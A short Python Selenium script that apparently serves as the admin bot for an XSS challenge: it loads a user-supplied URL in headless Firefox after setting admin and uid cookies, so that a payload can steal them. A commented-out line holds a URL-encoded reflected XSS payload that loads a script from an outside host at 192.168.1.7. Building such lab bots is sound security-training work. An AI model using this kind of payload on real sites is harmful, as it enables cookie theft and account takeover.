from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time
import re
import subprocess
subprocess.Popen(["bash","/httpd.sh",])
print("server started")
options = Options()
options.headless = True
driver = webdriver.Firefox(options=options, executable_path=r'/usr/local/bin/geckodriver')
print ("Headless Firefox Initialized")
#https?:\/\/([\w+\d+-\.]+)\/
#driver.get("http://localhost:8080/test")
while True :
    #driver.get("http://xss-challenge.com")
    try : 
        start_url=input("url to visit =>")
        #start_url = "http://xss-challenge.com/vuln/xss/?kw=%3Cscript+src%3D%22http%3A%2F%2F192.168.1.7%3A8888%2Fxss.js%22%3E%3C%2Fscript%3Etest%20keyword"
        domain = re.search('https?:\/\/([\w+\d+-\.\:]+)\/', start_url)
        driver.get(domain.group(0))
       # print(domain.group(1).split(":")[0])
        driver.add_cookie({"name" : "admin", "value" : "true"})
        driver.add_cookie({"name" : "uid", "value" : "4f94462b93425d83f62c07c035e19ccf"})
        driver.get(start_url)
        time.sleep(10)
    except Exception as e:
        print("error" +str(e))
